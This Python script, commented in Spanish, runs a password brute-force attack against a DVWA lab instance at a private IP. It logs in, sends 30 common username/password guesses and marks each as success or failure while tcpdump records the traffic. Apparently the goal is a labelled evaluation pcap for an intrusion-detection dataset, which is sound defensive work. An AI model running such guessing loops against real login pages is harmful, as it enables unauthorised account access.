import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS BRUTE FORCE EVALUACION
# DISTINTOS a los de entrenamiento_brute.py
# =============================================

PAYLOADS_BRUTE_EVALUACION = [
    ("admin", "football"),
    ("admin", "shadow"),
    ("admin", "sunshine"),
    ("admin", "princess"),
    ("admin", "baseball"),
    ("admin", "michael"),
    ("admin", "ashley"),
    ("admin", "mustang"),
    ("admin", "access"),
    ("admin", "696969"),
    ("admin", "cookie"),
    ("admin", "nicole"),
    ("admin", "jessica"),
    ("admin", "purple"),
    ("admin", "hunter"),
    ("admin", "ranger"),
    ("admin", "tigger"),
    ("admin", "cheese"),
    ("admin", "butter"),
    ("admin", "orange"),
    ("operator", "operator"),
    ("operator", "password"),
    ("manager", "manager"),
    ("manager", "password"),
    ("system", "system"),
    ("system", "password"),
    ("info", "info"),
    ("info", "password"),
    ("demo", "demo"),
    ("demo", "password"),
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_brute_eval(session):
    print("\n[*] Iniciando ataques Brute Force (evaluacion)...")
    payloads = PAYLOADS_BRUTE_EVALUACION.copy()
    random.shuffle(payloads)
    ok = 0
    for usuario, contrasena in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/brute/",
                            params={"username": usuario, "password": contrasena, "Login": "Login"})
            resultado = "EXITO" if "Welcome" in r.text else "fallo"
            print(f"  BRUTE_EVAL | {usuario}:{contrasena:<20} | {resultado} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Brute Force evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: BRUTE FORCE")
    print("  Target: " + BASE_URL)
    print("  Etiqueta real: 'brute'")
    print("")
    print("  !! IMPORTANTE !!")
    print("  NO subir el pcap a Elasticsearch.")
    print("  Guardarlo como: evaluacion_brute.pcap")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_brute_eval(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump y guarda el pcap como:")
    print("  evaluacion_brute.pcap")
    print("="*60)
